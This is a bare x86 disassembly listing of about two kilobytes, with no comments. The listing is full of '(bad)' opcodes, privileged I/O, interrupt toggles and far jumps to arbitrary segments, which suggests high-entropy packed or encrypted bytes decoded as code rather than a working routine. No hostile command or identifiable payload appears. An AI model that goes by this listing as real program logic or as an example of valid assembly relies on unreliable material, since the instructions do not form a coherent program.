  41e72f:	push   eax
  41e730:	fnstcw WORD PTR [ebx]
  41e732:	adc    al,0x4a
  41e734:	push   cs
  41e735:	in     al,0xf5
  41e737:	pop    ss
  41e738:	pusha  
  41e739:	dec    edi
  41e73a:	sbb    ecx,DWORD PTR [ecx+ecx*2]
  41e73d:	add    bl,BYTE PTR [edi+eax*1-0x71]
  41e741:	lock push edi
  41e743:	and    BYTE PTR [ecx],ch
  41e745:	push   ds
  41e746:	cmp    DWORD PTR [esi-0x4a],ecx
  41e749:	fwait
  41e74a:	sbb    eax,0x80eec6e0
  41e74f:	mov    edx,0xe367002b
  41e754:	in     eax,dx
  41e755:	in     eax,0xe4
  41e757:	xor    dh,BYTE PTR [edi+0x4aa8b48a]
  41e75d:	pop    ebp
  41e75e:	les    ebx,FWORD PTR [eax-0x41d531a4]
  41e764:	dec    eax
  41e765:	adc    DWORD PTR [eax+0x7d],edx
  41e768:	dec    edx
  41e769:	push   ebx
  41e76a:	shl    ebx,cl
  41e76c:	loope  0x41e778
  41e76e:	and    edx,DWORD PTR [ecx]
  41e770:	and    ebx,eax
  41e772:	add    eax,0xa5237f78
  41e777:	into   
  41e778:	and    eax,0xc252830f
  41e77d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e77e:	mov    eax,0xad56b1fd
  41e783:	test   BYTE PTR [ecx],bh
  41e785:	les    edi,FWORD PTR [edx+edi*4-0x279e4a4f]
  41e78c:	icebp  
  41e78d:	and    DWORD PTR [eax+0x63bb8354],0xbe7e12c9
  41e797:	popf   
  41e798:	pop    ebx
  41e799:	gs jae 0x41e7fb
  41e79c:	mov    cs,WORD PTR [ebp+esi*4-0x16]
  41e7a0:	jb     0x41e7d2
  41e7a2:	mov    WORD PTR [ecx+edi*4-0x494840a5],cs
  41e7a9:	dec    ebp
  41e7aa:	fcom   DWORD PTR [eax+0x47ba6e41]
  41e7b0:	in     al,0x2f
  41e7b2:	cli    
  41e7b3:	mov    eax,0x56e00947
  41e7b8:	push   ds
  41e7b9:	shl    DWORD PTR [ebx-0x30c29157],0xdc
  41e7c0:	sbb    BYTE PTR [esp+eax*4+0x1ade3ed7],bl
  41e7c7:	repnz push esi
  41e7c9:	push   ebp
  41e7ca:	(bad)  
  41e7cb:	arpl   bp,bp
  41e7cd:	mov    dh,0xd1
  41e7cf:	adc    esi,DWORD PTR [esi+0x7]
  41e7d2:	sub    ebx,eax
  41e7d4:	dec    eax
  41e7d5:	and    DWORD PTR [edx],ebx
  41e7d7:	mov    ds:0x45b5ef3c,al
  41e7dc:	or     cl,dl
  41e7de:	out    dx,al
  41e7df:	add    bl,ch
  41e7e1:	pop    ebx
  41e7e2:	pop    edx
  41e7e3:	xchg   BYTE PTR [ebx+0x5c],dl
  41e7e6:	imul   ebp,edi,0xffffffd8
  41e7e9:	add    edx,DWORD PTR [eax+ebp*4+0x489dcae3]
  41e7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7f1:	or     BYTE PTR [esi],bl
  41e7f3:	jo     0x41e7d7
  41e7f5:	or     al,0x83
  41e7f7:	add    dh,BYTE PTR [edx+0x138a8b89]
  41e7fd:	jecxz  0x41e853
  41e7ff:	sub    esp,DWORD PTR [ecx]
  41e801:	and    ebx,DWORD PTR [edi-0x5e264c78]
  41e807:	pop    ebp
  41e808:	ret    
  41e809:	aam    0x4a
  41e80b:	cmp    cl,ah
  41e80d:	test   BYTE PTR [ecx+ebx*2-0x1f43ad8c],bh
  41e814:	cmp    ch,ah
  41e816:	jo     0x41e7b3
  41e818:	mov    edi,0x650861d
  41e81d:	leave  
  41e81e:	out    0xca,eax
  41e820:	fnstcw WORD PTR [ebp+0x4bf5105a]
  41e826:	test   DWORD PTR [ebx],edx
  41e828:	and    ecx,ebp
  41e82a:	outs   dx,BYTE PTR ds:[esi]
  41e82b:	sub    esp,DWORD PTR [edx+0x7f]
  41e82e:	xchg   ebx,eax
  41e82f:	mov    eax,ds:0xb364d86b
  41e834:	js     0x41e811
  41e836:	lock mov ss,WORD PTR [ebp+0x38]
  41e83a:	out    0x2e,eax
  41e83c:	push   0xfffffff0
  41e83e:	pop    ebp
  41e83f:	in     eax,0x2c
  41e841:	push   esi
  41e842:	loop   0x41e814
  41e844:	xchg   edx,eax
  41e845:	adc    cl,BYTE PTR ds:0x50dc5e
  41e84b:	call   0xabd6:0x90c59c87
  41e852:	and    DWORD PTR [ecx+0x72],edx
  41e855:	imul   ebp,DWORD PTR [edx+0x55],0x6bcedfe4
  41e85c:	imul   ecx,DWORD PTR [edi+0x5d],0x5c
  41e860:	sub    DWORD PTR [ecx+0x4a],ecx
  41e863:	push   0x69ec2371
  41e868:	sub    al,0x76
  41e86a:	stc    
  41e86b:	and    al,0x23
  41e86d:	pop    edi
  41e86e:	cmp    al,0xba
  41e870:	es test al,0x2f
  41e873:	cli    
  41e874:	mov    edi,0x60d84a0b
  41e879:	lds    edx,FWORD PTR [eax+0x620edc76]
  41e87f:	mov    bl,0xc6
  41e881:	add    esi,DWORD PTR [ebx+0x25]
  41e884:	cmc    
  41e885:	les    edx,FWORD PTR ds:0xde479b8c
  41e88b:	lods   eax,DWORD PTR ds:[esi]
  41e88c:	jmp    0x41e8c4
  41e88e:	aad    0x68
  41e890:	repnz stos DWORD PTR es:[edi],eax
  41e892:	inc    esi
  41e893:	retf   
  41e894:	ss sbb eax,0xa4e7c18d
  41e89a:	sar    DWORD PTR [ebp+0x2b73fee1],1
  41e8a0:	dec    edx
  41e8a1:	pop    esp
  41e8a2:	shl    DWORD PTR [eax],1
  41e8a4:	xor    esp,ecx
  41e8a6:	or     al,0x92
  41e8a8:	jno    0x41e904
  41e8aa:	or     cl,BYTE PTR [ebp*8-0x2564d6aa]
  41e8b1:	test   BYTE PTR [ebx],ah
  41e8b3:	push   cs
  41e8b4:	repz adc BYTE PTR [edx+ebp*4+0x13179bda],ch
  41e8bc:	mov    bh,0x1f
  41e8be:	mov    ecx,fs
  41e8c0:	pop    esp
  41e8c1:	pop    ecx
  41e8c2:	loope  0x41e90d
  41e8c4:	iret   
  41e8c5:	or     edi,0x4d5b444e
  41e8cb:	outs   dx,DWORD PTR ds:[esi]
  41e8cc:	mov    dl,0x32
  41e8ce:	sbb    cl,BYTE PTR [ebp+0x584589eb]
  41e8d4:	loopne 0x41e92d
  41e8d6:	repz fs loope 0x41e907
  41e8da:	scas   eax,DWORD PTR es:[edi]
  41e8db:	sub    DWORD PTR [ebx+0x41],0xd04940d7
  41e8e2:	push   es
  41e8e3:	jne    0x41e88d
  41e8e5:	jns    0x41e8ea
  41e8e7:	add    BYTE PTR [esp+ebp*4-0x1b],ah
  41e8eb:	ret    
  41e8ec:	cmc    
  41e8ed:	cmc    
  41e8ee:	push   eax
  41e8ef:	push   edi
  41e8f0:	dec    ebp
  41e8f1:	sbb    ch,BYTE PTR [esi+0x560c10da]
  41e8f7:	lods   eax,DWORD PTR ds:[esi]
  41e8f8:	or     BYTE PTR [eax-0x39],ch
  41e8fb:	mov    DWORD PTR [edx+0x70],esi
  41e8fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8ff:	xchg   BYTE PTR ds:0x42bbd7c3,bl
  41e905:	adc    ah,BYTE PTR [ebx+0x15]
  41e908:	mov    dl,BYTE PTR [edi+0x5794c333]
  41e90e:	sub    al,0x7d
  41e910:	cmp    al,0x0
  41e912:	adc    ebx,DWORD PTR [ebp+0xf]
  41e915:	call   0xe0ff:0x18b85fe8
  41e91c:	(bad)  
  41e91d:	loope  0x41e8aa
  41e91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e920:	mov    esi,0xca065220
  41e925:	call   FWORD PTR [eax+0x72]
  41e928:	shl    DWORD PTR [ebx+0x1],cl
  41e92b:	pusha  
  41e92c:	and    al,0x6c
  41e92e:	jg     0x41e8dc
  41e930:	xchg   ch,dl
  41e932:	les    esi,FWORD PTR [ecx-0x67]
  41e935:	jecxz  0x41e8e9
  41e937:	lea    ebp,[edi-0x18096505]
  41e93d:	mov    ?,WORD PTR [esi]
  41e93f:	pavgb  mm2,QWORD PTR [ebx]
  41e942:	pop    esi
  41e943:	jns    0x41e8d3
  41e945:	add    eax,0x41f4fd56
  41e94a:	arpl   WORD PTR [eax+eax*2-0x5f],si
  41e94e:	shr    DWORD PTR [ebp+0x542ecfd0],0x4f
  41e955:	push   eax
  41e956:	mov    ds:0x4b6e80be,al
  41e95b:	mov    al,BYTE PTR [ebx-0x403b360a]
  41e961:	jbe    0x41e968
  41e963:	call   0x6b8c:0xd275c723
  41e96a:	and    eax,0x7f14915e
  41e96f:	mov    eax,0xa8ddfd0f
  41e974:	or     ah,BYTE PTR [edi-0x68b8cee8]
  41e97a:	dec    ebp
  41e97b:	test   BYTE PTR [ebp+0xe],0xc5
  41e97f:	aaa    
  41e980:	rol    ah,1
  41e982:	push   0xa6cc9061
  41e987:	das    
  41e988:	arpl   bp,cx
  41e98a:	push   esp
  41e98b:	sub    DWORD PTR [edx+0x64],0xffffff90
  41e98f:	call   0xf05bf56b
  41e994:	daa    
  41e995:	cld    
  41e996:	popf   
  41e997:	jmp    0x74e6f47a
  41e99c:	(bad)  
  41e99d:	sub    al,0x9d
  41e99f:	and    edi,ebp
  41e9a1:	sub    al,0x9b
  41e9a3:	std    
  41e9a4:	mov    ch,0xb9
  41e9a6:	enter  0xf7b9,0x73
  41e9aa:	cmp    al,bl
  41e9ac:	adc    al,0xdc
  41e9ae:	dec    esi
  41e9af:	push   ss
  41e9b0:	retf   
  41e9b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9b2:	jne    0x41e9eb
  41e9b4:	cmc    
  41e9b5:	pop    edi
  41e9b6:	ss stos BYTE PTR es:[edi],al
  41e9b8:	or     al,0x44
  41e9ba:	push   ebx
  41e9bb:	in     eax,dx
  41e9bc:	mov    dl,0x72
  41e9be:	repz popa 
  41e9c0:	ins    BYTE PTR es:[edi],dx
  41e9c1:	xchg   edi,eax
  41e9c2:	sbb    BYTE PTR [edx],0x94
  41e9c5:	dec    ebp
  41e9c6:	fbstp  TBYTE PTR [ebp+0x18e3cb0e]
  41e9cc:	inc    edi
  41e9cd:	dec    eax
  41e9ce:	jle    0x41e9c5
  41e9d0:	mov    ch,0xd4
  41e9d2:	sbb    eax,0xbada7b00
  41e9d7:	std    
  41e9d8:	sub    al,0x9f
  41e9da:	or     edx,ebp
  41e9dc:	mov    ecx,0xdf8ef1d4
  41e9e1:	data16 sub dh,ah
  41e9e4:	fnstcw WORD PTR [ebp+0x59]
  41e9e7:	mov    cl,0x9b
  41e9e9:	scas   eax,DWORD PTR es:[edi]
  41e9ea:	rcr    DWORD PTR [ecx],1
  41e9ec:	mov    edx,0xb6eefdf1
  41e9f1:	sbb    al,0xf1
  41e9f3:	cmp    eax,0xf3895dda
  41e9f8:	mov    bl,0xa8
  41e9fa:	jo     0x41e9b4
  41e9fc:	lds    eax,FWORD PTR [edx-0x54]
  41e9ff:	cs test eax,0x3d73dcd8
  41ea05:	or     eax,0x19444acb
  41ea0a:	popa   
  41ea0b:	pop    ebx
  41ea0c:	jns    0x41ea24
  41ea0e:	loopne 0x41ea20
  41ea10:	push   ss
  41ea11:	leave  
  41ea12:	inc    ebx
  41ea13:	sbb    DWORD PTR [ecx],0x6b30d621
  41ea19:	inc    ebx
  41ea1a:	mov    esi,0x771d6a5c
  41ea1f:	cmp    dh,BYTE PTR [eax]
  41ea21:	fdiv   QWORD PTR [esi]
  41ea23:	adc    esi,edi
  41ea25:	das    
  41ea26:	arpl   WORD PTR [esi],bp
  41ea28:	scas   eax,DWORD PTR es:[edi]
  41ea29:	mov    eax,ds:0x2f6f4a84
  41ea2e:	cmc    
  41ea2f:	ret    0x6dd7
  41ea32:	add    al,0xf6
  41ea34:	in     al,0x18
  41ea36:	std    
  41ea37:	cmp    BYTE PTR [ebp-0x3a],cl
  41ea3a:	jmp    0x41ea1d
  41ea3c:	retf   0x86aa
  41ea3f:	rcr    DWORD PTR [ebx-0x3848ab7b],cl
  41ea45:	js     0x41ea6b
  41ea47:	rol    DWORD PTR [ebp-0x62],1
  41ea4a:	ret    0x8fba
  41ea4d:	inc    edi
  41ea4e:	std    
  41ea4f:	or     edi,DWORD PTR cs:[ebx-0x2106d230]
  41ea56:	pop    ss
  41ea57:	cmp    BYTE PTR [esp-0x6f],bh
  41ea5b:	mov    eax,ds:0x43c6120c
  41ea60:	repnz shl esi,0xf5
  41ea64:	mov    ah,0x39
  41ea66:	data16 mov al,0xa1
  41ea69:	dec    esi
  41ea6a:	push   esi
  41ea6b:	and    esi,edx
  41ea6d:	out    dx,al
  41ea6e:	(bad)  
  41ea70:	inc    ebp
  41ea71:	pop    edi
  41ea72:	sbb    BYTE PTR [ecx+0x23],al
  41ea75:	out    0x9b,eax
  41ea77:	(bad)  
  41ea78:	idiv   ch
  41ea7a:	inc    edi
  41ea7b:	pop    esp
  41ea7c:	mov    dl,BYTE PTR [edi]
  41ea7e:	mov    al,0x87
  41ea80:	mov    gs,WORD PTR [ebp+0x5a]
  41ea83:	nop
  41ea84:	fwait
  41ea85:	mul    DWORD PTR [edi+esi*2]
  41ea88:	push   ss
  41ea89:	mov    al,0x72
  41ea8b:	es retf 
  41ea8d:	xchg   ebp,eax
  41ea8e:	fwait
  41ea8f:	in     al,0x55
  41ea91:	es cs nop
  41ea94:	add    DWORD PTR [esi+ebx*8+0x6c],ecx
  41ea98:	mov    bl,0xf9
  41ea9a:	aaa    
  41ea9b:	imul   ecx,DWORD PTR es:[ecx+0x51],0x79e88529
  41eaa3:	sbb    BYTE PTR [eax+0x5e],bh
  41eaa6:	add    al,0xef
  41eaa8:	retf   
  41eaa9:	mov    al,0xf
  41eaab:	mov    cl,0xb7
  41eaad:	inc    edi
  41eaae:	jg     0x41eaac
  41eab0:	loope  0x41ea47
  41eab2:	rcl    BYTE PTR [ebp+0x53],cl
  41eab5:	jbe    0x41ead4
  41eab7:	xchg   edx,eax
  41eab8:	inc    BYTE PTR [ecx+ebx*1-0x7d6e5b31]
  41eabf:	inc    eax
  41eac0:	mov    eax,0x1a77b6a5
  41eac5:	push   es
  41eac6:	push   ebp
  41eac7:	xchg   edi,eax
  41eac8:	sbb    ebp,DWORD PTR [ebx]
  41eaca:	nop
  41eacb:	out    dx,eax
  41eacc:	or     al,0x4c
  41eace:	jno    0x41eac7
  41ead0:	mov    edx,0xcd9bcd85
  41ead5:	xor    ecx,DWORD PTR [esi-0x43a5fe22]
  41eadb:	into   
  41eadc:	out    0xbe,al
  41eade:	ret    0x4a29
  41eae1:	push   ebp
  41eae2:	mov    ds:0xd8874684,eax
  41eae7:	js     0x41eb67
  41eae9:	sbb    esp,DWORD PTR [esi]
  41eaeb:	in     eax,0xa7
  41eaed:	lahf   
  41eaee:	pop    edi
  41eaef:	test   BYTE PTR [edi+0x6d19202b],ch
  41eaf5:	mov    bl,0x4e
  41eaf7:	mov    DWORD PTR [ebp+0xa5a5697],0x26f5b8ae
  41eb01:	div    DWORD PTR [ebp-0x7e8e0c25]
  41eb07:	mov    esp,DWORD PTR [edi-0x6a]
  41eb0a:	out    0xe8,eax
  41eb0c:	das    
  41eb0d:	leave  
  41eb0e:	cmp    cl,al
  41eb10:	cwde   
  41eb11:	mov    cl,0x13
  41eb13:	jo     0x41eb54
  41eb15:	jl     0x41eb54
  41eb17:	push   es
  41eb18:	pop    edx
  41eb19:	xchg   DWORD PTR [esi],ecx
  41eb1b:	pop    eax
  41eb1c:	xchg   ecx,eax
  41eb1d:	sar    DWORD PTR [eax+0x4a],0x29
  41eb21:	mov    bh,0xc9
  41eb23:	or     BYTE PTR [eax+ebp*8+0x7279fb64],0xc5
  41eb2b:	arpl   WORD PTR [edi],bx
  41eb2d:	jno    0x41ead8
  41eb2f:	or     bh,bh
  41eb31:	add    eax,eax
  41eb33:	test   BYTE PTR [ecx+ecx*4],dl
  41eb36:	xchg   esp,eax
  41eb37:	mov    edi,0x7059293c
  41eb3c:	jbe    0x41eb76
  41eb3e:	pop    es
  41eb3f:	and    al,0xe7
  41eb41:	jg     0x41eafc
  41eb43:	inc    esi
  41eb44:	aad    0xc9
  41eb46:	push   ds
  41eb47:	fisub  WORD PTR [esi+0x4d6b3ab7]
  41eb4d:	push   ecx
  41eb4e:	imul   BYTE PTR [ecx-0x2e]
  41eb51:	adc    DWORD PTR [edx],esi
  41eb53:	arpl   WORD PTR [eax-0x30f7289],bp
  41eb59:	or     ebx,ebp
  41eb5b:	adc    DWORD PTR [esi-0x29],0x30
  41eb5f:	pop    ss
  41eb60:	call   0x1c962234
  41eb65:	mov    bh,0xc1
  41eb67:	fcomp  DWORD PTR [edx-0x33a65ba6]
  41eb6d:	or     DWORD PTR [esi-0x68],esi
  41eb70:	icebp  
  41eb71:	cdq    
  41eb72:	and    eax,0x49c782c0
  41eb77:	push   cs
  41eb78:	fcom   DWORD PTR [ebx-0x21]
  41eb7b:	pusha  
  41eb7c:	xchg   ebx,eax
  41eb7d:	and    DWORD PTR [ebx+esi*2],edi
  41eb80:	es pop ds
  41eb82:	push   ebx
  41eb83:	dec    ebx
  41eb84:	or     ah,0xac
  41eb87:	mov    cl,ch
  41eb89:	lea    ebp,[eax-0x4a191eeb]
  41eb8f:	aas    
  41eb90:	dec    esi
  41eb91:	iret   
  41eb92:	mov    ebp,0xf03cd570
  41eb97:	fwait
  41eb98:	mov    ds:0xd11fc395,eax
  41eb9d:	sub    al,0x7f
  41eb9f:	aaa    
  41eba0:	dec    esp
  41eba1:	int3   
  41eba2:	adc    ecx,ebp
  41eba4:	mov    dh,cl
  41eba6:	and    BYTE PTR ds:0xce07acc2,dh
  41ebac:	adc    al,0xd6
  41ebae:	add    al,0xef
  41ebb0:	push   esi
  41ebb1:	mov    ah,0x55
  41ebb3:	xlat   BYTE PTR ds:[ebx]
  41ebb4:	das    
  41ebb5:	lods   al,BYTE PTR ds:[esi]
  41ebb6:	shl    DWORD PTR [edi+0x65e4de62],0x8e
  41ebbd:	stos   BYTE PTR es:[edi],al
  41ebbe:	xlat   BYTE PTR fs:[ebx]
  41ebc0:	push   edx
  41ebc1:	rcl    BYTE PTR [eax],0x24
  41ebc4:	js     0x41eb51
  41ebc6:	scas   al,BYTE PTR es:[edi]
  41ebc7:	add    dh,BYTE PTR [edi]
  41ebc9:	jge    0x41eb5c
  41ebcb:	pop    ss
  41ebcc:	adc    ecx,DWORD PTR [edi+edx*1]
  41ebcf:	dec    esi
  41ebd0:	pushf  
  41ebd1:	cdq    
  41ebd2:	rcl    DWORD PTR [ebx],cl
  41ebd4:	push   ds
  41ebd5:	mov    ebx,0x9b32206b
  41ebda:	out    0x48,eax
  41ebdc:	xchg   ebp,eax
  41ebdd:	jns    0x41ebe6
  41ebdf:	in     eax,dx
  41ebe0:	jmp    0x41ec10
  41ebe2:	pop    eax
  41ebe3:	mov    ah,0x3
  41ebe5:	adc    al,0x41
  41ebe7:	(bad)  
  41ebe8:	sar    ch,cl
  41ebea:	cmc    
  41ebeb:	ror    DWORD PTR cs:[ebp-0x4b],1
  41ebef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebf0:	shl    dh,0xb6
  41ebf3:	sub    eax,0x95d9e1b6
  41ebf8:	adc    eax,0x29c170b1
  41ebfd:	inc    eax
  41ebfe:	sub    al,0x24
  41ec00:	mov    ebx,0x8d240905
  41ec05:	adc    eax,0x16244870
  41ec0a:	xchg   ebp,eax
  41ec0b:	fwait
  41ec0c:	mov    ecx,0x486a512
  41ec11:	test   dh,ch
  41ec13:	push   esi
  41ec14:	or     eax,0xf43c392f
  41ec19:	jmp    0x7b0a:0xd38cad83
  41ec20:	mov    edi,0x856222d0
  41ec25:	jge    0x41ebb4
  41ec27:	sub    ecx,DWORD PTR [edi+0xe]
  41ec2a:	int    0x86
  41ec2c:	test   al,0x1c
  41ec2e:	jmp    0x41ec24
  41ec30:	push   esp
  41ec31:	(bad)  
  41ec33:	shl    BYTE PTR [edx],1
  41ec35:	mov    BYTE PTR [edx+0x77050f77],bl
  41ec3b:	cdq    
  41ec3c:	call   0x7d24:0xe014500b
  41ec43:	sar    DWORD PTR [esi],1
  41ec45:	imul   edi,DWORD PTR [esi],0x2e
  41ec48:	repz arpl WORD PTR [edi],ax
  41ec4b:	inc    ebp
  41ec4c:	in     al,dx
  41ec4d:	mov    esp,0xb15f8b98
  41ec52:	jbe    0x41ec9c
  41ec54:	dec    eax
  41ec55:	fstp   st(4)
  41ec57:	pop    ebx
  41ec58:	test   BYTE PTR [edx],0x9a
  41ec5b:	push   esp
  41ec5c:	jmp    0xf75958fb
  41ec61:	push   edi
  41ec62:	adc    esp,DWORD PTR ds:0x7299239a
  41ec68:	jp     0x41ecce
  41ec6a:	mov    al,ds:0x2efe7830
  41ec6f:	inc    edx
  41ec70:	push   es
  41ec71:	(bad)  
  41ec72:	es pushf 
  41ec74:	les    edx,FWORD PTR [ecx]
  41ec76:	stos   BYTE PTR es:[edi],al
  41ec77:	push   edx
  41ec78:	xchg   ebp,eax
  41ec79:	cmp    al,0x1
  41ec7b:	rcl    BYTE PTR ds:0xd92cff3e,cl
  41ec81:	inc    ebp
  41ec82:	js     0x41ecea
  41ec84:	inc    ebp
  41ec85:	fldl2e 
  41ec87:	dec    ecx
  41ec88:	je     0x41ec0f
  41ec8a:	and    DWORD PTR [ecx-0x591684a3],esp
  41ec90:	lock int 0x8d
  41ec93:	arpl   bp,di
  41ec95:	sub    BYTE PTR [eax-0x3867b91f],dh
  41ec9b:	lds    ecx,FWORD PTR [esi]
  41ec9d:	mov    ch,BYTE PTR [eax+0x55]
  41eca0:	mov    eax,ds:0x59fef2a6
  41eca5:	scas   al,BYTE PTR es:[edi]
  41eca6:	pop    ebp
  41eca7:	data16 jle 0x41ecd5
  41ecaa:	daa    
  41ecab:	mov    esi,esp
  41ecad:	mov    esp,0x8b296431
  41ecb2:	and    DWORD PTR [esi+0xe],0x4f
  41ecb6:	repnz (bad) 
  41ecb8:	out    0xa2,eax
  41ecba:	xor    al,0xe
  41ecbc:	xchg   BYTE PTR [esi],bl
  41ecbe:	xor    DWORD PTR [eax],esi
  41ecc0:	push   ecx
  41ecc1:	lock fnstsw WORD PTR [edi]
  41ecc4:	push   ecx
  41ecc5:	xchg   esp,eax
  41ecc6:	adc    ebx,0xffffffae
  41ecc9:	sub    BYTE PTR [ecx],cl
  41eccb:	dec    eax
  41eccc:	out    0xca,eax
  41ecce:	fwait
  41eccf:	mov    bl,0xfd
  41ecd1:	push   0xffffffda
  41ecd3:	and    DWORD PTR [eax-0x40],esp
  41ecd6:	fist   DWORD PTR [eax+0x5b]
  41ecd9:	(bad)  
  41ecda:	cli    
  41ecdb:	and    al,0x6b
  41ecdd:	(bad)
  41ece0:	sub    DWORD PTR [edi+ecx*2-0x27e5cf0a],ecx
  41ece7:	jg     0x41ec6d
  41ece9:	sub    DWORD PTR [ebp-0xd34700a],edx
  41ecef:	fld    st(2)
  41ecf1:	push   edx
  41ecf2:	pop    ebx
  41ecf3:	inc    edx
  41ecf4:	push   es
  41ecf5:	dec    ebx
  41ecf6:	ja     0x41ec96
  41ecf8:	test   esi,ecx
  41ecfa:	mov    bh,dl
  41ecfc:	fcmovu st,st(6)
  41ecfe:	in     eax,0x1f
  41ed00:	sub    ebx,edi
  41ed02:	div    BYTE PTR [ebx]
  41ed04:	jg     0x41ed3a
  41ed06:	test   BYTE PTR [edx-0x77],dh
  41ed09:	inc    edx
  41ed0a:	xor    al,0x1d
  41ed0c:	sub    esp,ecx
  41ed0e:	mov    dh,0x8f
  41ed10:	push   0xffffffb7
  41ed12:	push   esi
  41ed13:	push   0x6ca81f49
  41ed18:	sahf   
  41ed19:	mov    BYTE PTR [edi-0x5e0ffb71],ah
  41ed1f:	fucomp st(4)
  41ed21:	inc    ebp
  41ed22:	js     0x41ecc5
  41ed24:	test   al,0x6d
  41ed26:	xchg   edx,eax
  41ed27:	adc    eax,0x7a540d4f
  41ed2c:	ret    
  41ed2d:	pop    ds
  41ed2e:	mov    dh,0x91
  41ed30:	sbb    DWORD PTR [edi+0x176ad732],0x7a198110
  41ed3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed3b:	pop    esp
  41ed3c:	add    dh,bl
  41ed3e:	or     eax,0x16b8f57a
  41ed43:	arpl   WORD PTR [ebx+edi*4-0x43],bx
  41ed47:	mov    dh,0x52
  41ed49:	fiadd  WORD PTR [ebx]
  41ed4b:	iret   
  41ed4c:	push   ss
  41ed4d:	gs push edi
  41ed4f:	sbb    al,0xf9
  41ed51:	sbb    DWORD PTR [edx],edi
  41ed53:	jecxz  0x41ece1
  41ed55:	or     al,0x26
  41ed57:	(bad)  
  41ed58:	cmp    BYTE PTR [esi],ah
  41ed5a:	or     eax,0x8ea01211
  41ed5f:	jne    0x41ed8a
  41ed61:	aad    0xd
  41ed63:	cdq    
  41ed64:	lods   al,BYTE PTR ds:[esi]
  41ed65:	sar    edx,0xfd
  41ed68:	pushf  
  41ed69:	aaa    
  41ed6a:	int    0xa2
  41ed6c:	xchg   ebx,eax
  41ed6d:	dec    ebp
  41ed6e:	cmp    al,0x9e
  41ed70:	retf   
  41ed71:	xor    eax,DWORD PTR [eax+0x6e]
  41ed74:	pop    ds
  41ed75:	loope  0x41ed5f
  41ed77:	adc    al,0xf4
  41ed79:	push   eax
  41ed7a:	or     eax,0x204e2cec
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	bnd jle 0x41ed6c
  41ed83:	inc    edi
  41ed84:	mov    ebp,0xe1c55604
  41ed89:	enter  0x8553,0x6f
  41ed8d:	sbb    DWORD PTR [ebx+0x5b],ebp
  41ed90:	push   edx
  41ed91:	das    
  41ed92:	mov    bl,0xbf
  41ed94:	lods   al,BYTE PTR ds:[esi]
  41ed95:	sbb    DWORD PTR [ebp+0x1c],esi
  41ed98:	sbb    esi,ebp
  41ed9a:	fisub  WORD PTR ds:0xc5b0ae59
  41eda0:	pop    es
  41eda1:	mov    ecx,DWORD PTR [ecx]
  41eda3:	outs   dx,BYTE PTR ds:[esi]
  41eda4:	mov    edi,0x74d22b56
  41eda9:	popf   
  41edaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edab:	jmp    0x7383:0xe5c23985
  41edb2:	mov    ds:0xd850a72d,al
  41edb7:	out    dx,al
  41edb8:	mov    al,ds:0xef23ecdf
  41edbd:	sub    bh,BYTE PTR [eax+eiz*4+0x18]
  41edc1:	scas   eax,DWORD PTR es:[edi]
  41edc2:	js     0x41ee09
  41edc4:	cmp    al,0xab
  41edc6:	test   al,0x94
  41edc8:	rcl    DWORD PTR [esi+0x79],0x4a
  41edcc:	mov    edx,0x4f8ff20
  41edd1:	push   eax
  41edd2:	mov    eax,0x585e805d
  41edd7:	es pop esi
  41edd9:	jmp    0xf9e48e1b
  41edde:	jmp    DWORD PTR [esi+ecx*1-0x5a]
  41ede2:	jo     0x41edf6
  41ede4:	add    eax,0x6a2f4501
  41ede9:	mov    al,ds:0xc6ef734
  41edee:	mov    DWORD PTR [ecx+ebx*2-0x1b],ecx
  41edf2:	inc    edx
  41edf3:	jae    0x41ee5d
  41edf5:	mov    esi,0xfe314835
  41edfa:	inc    edx
  41edfb:	and    cl,BYTE PTR [ebx+0x5fb6497f]
  41ee01:	inc    edx
  41ee02:	jae    0x41ee0f
  41ee04:	fistp  QWORD PTR [esi-0x7cea5ef8]
  41ee0a:	retf   0x1175
  41ee0d:	adc    bl,BYTE PTR [ebp-0x26f6aae9]
  41ee13:	call   0xac948acb
  41ee18:	(bad)  
  41ee19:	sti    
  41ee1a:	pop    es
  41ee1b:	xor    BYTE PTR gs:[ebx],cl
  41ee1e:	not    DWORD PTR [ecx-0x59472e5b]
  41ee24:	cdq    
  41ee25:	sub    DWORD PTR [edi+0x68],ecx
  41ee28:	sbb    DWORD PTR [ebx+0x39],esp
  41ee2b:	in     eax,0x5f
  41ee2d:	ds mov esp,0xb165d268
  41ee33:	outs   dx,DWORD PTR ds:[esi]
  41ee34:	push   eax
  41ee35:	mov    cl,0x2c
  41ee37:	sahf   
  41ee38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee39:	(bad)  
  41ee3a:	mov    ds:0x125f5695,eax
  41ee3f:	fadd   DWORD PTR [eax-0x56c25357]
  41ee45:	dec    ebp
  41ee46:	int    0x8
  41ee48:	push   esp
  41ee49:	pop    esi
  41ee4a:	fwait
  41ee4b:	es adc eax,0x7511fce7
  41ee51:	push   ebx
  41ee52:	aas    
  41ee53:	ins    DWORD PTR es:[edi],dx
  41ee54:	rcl    BYTE PTR [ebp+0x464d942c],0x3a
  41ee5b:	rol    BYTE PTR ds:0xd6c45826,1
  41ee61:	ins    BYTE PTR es:[edi],dx
  41ee62:	pop    ecx
  41ee63:	mov    esi,0xf7fb4da9
  41ee68:	mov    al,ds:0xa33adb5
  41ee6d:	ret    
  41ee6e:	frstor [edi+0x3d]
  41ee71:	push   ebx
  41ee72:	adc    DWORD PTR [edx-0x31141c5f],esi
  41ee78:	sti    
  41ee79:	ds out 0x5b,al
  41ee7c:	or     al,BYTE PTR [esi-0x46]
  41ee7f:	mov    dh,0x54
  41ee81:	in     al,dx
  41ee82:	stc    
  41ee83:	loopne 0x41ee7c
  41ee85:	repz dec si
  41ee88:	cld    
  41ee89:	xor    al,0xe1
  41ee8b:	xor    dl,BYTE PTR [esi-0x3beb2ba]
  41ee91:	adc    BYTE PTR [esi+0x68dc1d18],0x86
  41ee98:	std    
  41ee99:	leave  
  41ee9a:	jg     0x41ee60
  41ee9c:	inc    BYTE PTR [edi+0x11]
  41ee9f:	jl     0x41ee97
